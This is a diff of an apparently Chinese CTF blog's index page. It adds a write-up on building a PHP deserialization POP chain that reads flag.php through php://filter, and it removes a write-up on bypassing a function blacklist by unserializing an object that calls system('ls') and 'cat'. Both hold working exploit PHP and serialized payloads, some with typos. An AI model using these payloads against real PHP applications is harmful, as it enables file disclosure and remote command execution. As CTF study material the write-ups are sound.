@@ -172,6 +172,118 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-pop链构造1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/08/pop%E9%93%BE%E6%9E%84%E9%80%A01/" class="article-date">
+  	<time datetime="2021-09-07T16:00:00.000Z" itemprop="datePublished">2021-09-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/08/pop%E9%93%BE%E6%9E%84%E9%80%A01/">
+        pop链构造1
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="pop链构造1"><a href="#pop链构造1" class="headerlink" title="pop链构造1"></a>pop链构造1</h1><p>打开页面后，发现源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中有几个魔术方法，所以可能是pop链的构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__invoke()魔术方法：在类的对象被调用为函数时候，自动被调用</span><br><span class="line">__toString()魔术方法：在类的对象被当作字符串操作的时候，自动被调用</span><br><span class="line">__wakeup()魔术方法，在类的对象反序列化的时候，自动被调用</span><br><span class="line">__construct()构造方法：在类的对象实例化之前，自动被调用</span><br><span class="line">__get()魔术方法：从不可访问的属性中读取数据会触发</span><br></pre></td></tr></table></figure>
+
+<p>从代码中，我们可以看见一个include()包含的函数，因此，我们需要想办法使用这个函数帮我们读取文件，而要使用include()函数，我们需要调用Modifier类中的append()方法，而要调用Modifier类中的append()方法，我们需要调用Modifier类中的__invoke()魔术方法，而要调用__invoke()魔术方法，要将类的对象被调用为函数，所以我们可以看见Test类中的__get()方法中的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$function=$this-&gt;p;</span><br><span class="line">return $function();</span><br></pre></td></tr></table></figure>
+<p>我们可以构造$this-&gt;p=new Modifier();来调用__invoke()方法，而这其中需要调用__get()方法，而调用__get()方法，需要从不可访问的属性中读取数据时会触发，所以我们可以想到Show类的__toString()方法，其中的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;str-&gt;source;</span><br></pre></td></tr></table></figure>
+<p>所以我们可以构造$this-&gt;str=new Test();来触发__get方法，而要触发__toString()方法，要在类的对象被当作字符串操作时，所以我们可以看到__wakeup()魔术方法中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source))</span><br></pre></td></tr></table></figure>
+<p>所以我们可以构造$this-&gt;source=new Show();</p>
+<p>所以我们可以构造exp，但是我们要在Show类中让$this-&gt;source为Show类的话，我们最后还需要用到__contruct()魔术方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=new Show(&#x27;s&#x27;);  #就会触发__contruct()魔术方法，且将s作为__contruct()的参数</span><br><span class="line"></span><br><span class="line">因此，链条为</span><br></pre></td></tr></table></figure>
+<p>include()–&gt;append()–&gt;_invoke()–&gt;__get()–&gt;__toString()–&gt;__wakeup()–&gt;unserialize()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以我们构造exp</span><br></pre></td></tr></table></figure>
+<p>Welcome to index.php<br>&lt;?php<br>//flag is in flag.php</p>
+<p>class Modifier {<br>    protected  $var=”php://filter/read=convert.base64-encode/resource=flag.php”;</p>
+<p>}</p>
+<p>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct($file=’index.php’){<br>        $this-&gt;source = $file;<br>    }<br>    public function __toString(){<br>        $this-&gt;str=new Test();<br>    }</p>
+<pre><code>public function __wakeup()&#123;
+    $this-&gt;source=new Show();
+&#125;
+</code></pre>
+<p>}</p>
+<p>class Test{<br>    public $p;</p>
+<pre><code>public function __get($key)&#123;
+    $this-&gt;p=new Modifier();
+&#125;
+</code></pre>
+<p>}</p>
+<p>$a=new Show();<br>$b=new Show($a)<br>$a-&gt;str=new Test();<br>$a-&gt;str-&gt;p=new Modifier();</p>
+<p>echo urlencode(serialize($b));<br>?&gt;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后对代码的详细解析</span><br></pre></td></tr></table></figure>
+<p>Welcome to index.php<br>&lt;?php<br>//flag is in flag.php                                    //提示：flag在flag.php文件内，猜测是当前网站根目录下的flag.php<br>//WTF IS THIS?<br>//Learn From <a target="_blank" rel="noopener" href="https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</a><br>//And Crack It!</p>
+<p>class Modifier {                                        //类，Modifier<br>    protected  $var;                                    //保护属性，$var<br>    public function append($value){                        //自定义方法，append($value)<br>        include($value);                                //文件包含参数$value，猜测这里可以利用文件包含读取flag.php的内容<br>    }<br>    public function __invoke(){                            //__invoke()魔术方法：在类的对象被调用为函数时候，自动被调用<br>        $this-&gt;append($this-&gt;var);                        //把保护属性$var传入自定义方法append($value)，执行一次<br>    }<br>}<br>//很明显：<br>//这里我们要想执行文件包含flag.php，那么就要调用append($value)方法<br>//这里我们要想调用append($value)方法，那么就需要调用__invoke()魔术方法<br>//这里我们要想调用__invoke()，那么就需要将Modifier类的对象调用为函数<br>//这里，我们会发现$var属性的值传给了$value参数，所以要想包含flag.php的源码，就需要给$var传入php://filter………………..[省略]</p>
+<p>class Show{                                                //类，Show<br>    public $source;                                     //公有属性，$source<br>    public $str;                                        //公有属性，$str<br>    public function __construct($file=’index.php’){        //公有构造方法，在类的对象实例化之前，自动被调用<br>        $this-&gt;source = $file;                            //给$this-&gt;source属性赋值$file<br>        echo ‘Welcome to ‘.$this-&gt;source.”<br>“;        //打印字符串<br>    }<br>    public function __toString(){                        //__toString()魔术方法，在类的对象被当作字符串操作的时候，自动被调用<br>        return $this-&gt;str-&gt;source;                        //返回，str属性值的source属性<br>    }</p>
+<pre><code>public function __wakeup()&#123;                            //__wakeup()魔术方法，在类的对象反序列化的时候，自动被调用
+    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;    //正则匹配source属性的值
+        echo &quot;hacker&quot;;
+        $this-&gt;source = &quot;index.php&quot;;                //source属性赋值为index.php
+    &#125;
+&#125;
+</code></pre>
+<p>}<br>//很明显：<br>//__toString()魔术方法，有以下特征“$this-&gt;str-&gt;source”<br>//所以说，我们可以给str属性赋值为Test类的对象，那么由于该对象没有source属性，那么就会调用Test类的__get()魔术方法<br>//那么想要调用__toString魔术方法，就需要Show类的对象被当作字符串操作<br>//很明显，我们的__wakeup()魔术方法，里面有source属性被当作字符串去比较，所以我们可以给source属性赋值为Show属性的对象<br>//所以只要，我们可以利用反序列化，调用__wake()魔术方法，且source赋值为该类的对象，str属性赋值为Test类的对象即可</p>
+<p>class Test{                                                //类，Test<br>    public $p;                                            //公有属性，$p<br>    public function __construct(){                        //公有构造方法，在类的对象实例化之前，自动被调用<br>        $this-&gt;p = array();                                //属性$p初始化为数组<br>    }</p>
+<pre><code>public function __get($key)&#123;                        //__get()魔术方法，访问该类中不可访问的属性，自动被调用
+    $function = $this-&gt;p;                            //属性$this-&gt;p赋值给$function
+    return $function();                                //把$function调用为$function()函数
+&#125;
+</code></pre>
+<p>}<br>//很明显：<br>//这里的属性$p可以触发，__invoke()魔术方法，所以只要给$p赋值为Modifier类的对象即可</p>
+<p>if(isset($_GET[‘pop’])){<br>    @unserialize($_GET[‘pop’]);<br>}<br>else{<br>    $a=new Show;<br>    highlight_file(<strong>FILE</strong>);<br>}</p>
+<p>```<br>最后会回显base64码</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-绕过数组长度的反序列化" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1005,88 +1117,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-各函数过滤绕过的反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/03/%E5%90%84%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
-  	<time datetime="2021-09-02T16:00:00.000Z" itemprop="datePublished">2021-09-03</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/03/%E5%90%84%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
-        各函数过滤绕过反序列化漏洞
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="各函数过滤绕过反序列化漏洞"><a href="#各函数过滤绕过反序列化漏洞" class="headerlink" title="各函数过滤绕过反序列化漏洞"></a>各函数过滤绕过反序列化漏洞</h1><p>打开页面，然后进行抓包，发现有两个post提交的参数为func和p，然后再看页面的提示，我们可以猜测func是函数，而p是函数里的参数，所以我们可以在抓的包里构造post提交的两个参数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=file_get_contents&amp;p=index.php</span><br></pre></td></tr></table></figure>
-<p>我们可以得到源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">  function gettime($func, $p) &#123;</span><br><span class="line">      $result = call_user_func($func, $p);</span><br><span class="line">      $a= gettype($result);</span><br><span class="line">      if ($a == &quot;string&quot;) &#123;</span><br><span class="line">          return $result;</span><br><span class="line">      &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  class Test &#123;</span><br><span class="line">      var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">      var $func = &quot;date&quot;;</span><br><span class="line">      function __destruct() &#123;</span><br><span class="line">          if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">              echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">  $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">  if ($func != null) &#123;</span><br><span class="line">      $func = strtolower($func);</span><br><span class="line">      if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">          echo gettime($func, $p);</span><br><span class="line">      &#125;else &#123;</span><br><span class="line">          die(&quot;Hacker...&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>
-
-
-<p>其中，我们看见call_user_func()函数，我们可以利用call_user_func()函数</p>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>call_user_func()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()函数是类似于一种特别的调用函数的方法</span><br></pre></td></tr></table></figure>
-<p>call_user_func_array()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func函数是类似于一种特别的调用函数的方法，不过参数要为数组</span><br></pre></td></tr></table></figure>
-<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>call_user_func()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Class Test&#123;</span><br><span class="line">	$a=0;</span><br><span class="line">	function b($a)&#123;</span><br><span class="line">		echo $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(&#x27;b&#x27;,$a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>call_user_func_array()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Class Test&#123;</span><br><span class="line"></span><br><span class="line">	$a=0;</span><br><span class="line">	function b($c)&#123;</span><br><span class="line">		echo $c;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func_array(&#x27;b&#x27;,array($a));</span><br><span class="line">call_user_func_array(array(&#x27;Test&#x27;,&#x27;b&#x27;),array($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>但是，我们不知道flag在哪个文件里，所以我们使用system()函数来找flag的位置，但是system()被过滤掉了，但是我们发现它只对func进行函数的检测，所以我们可以利用反序列化的方式来构造func参数的值为system()<br>exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;ls&quot;;</span><br><span class="line">        var $func = &quot;system&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$a=new Tset();</span><br><span class="line">echo serialize($a);   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>因此我们可以构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们便可以看到目录，找到flag所在文件后，只需构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unseraialize&amp;pO:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;cat 文件名&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看见flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
 	</div>
 
       
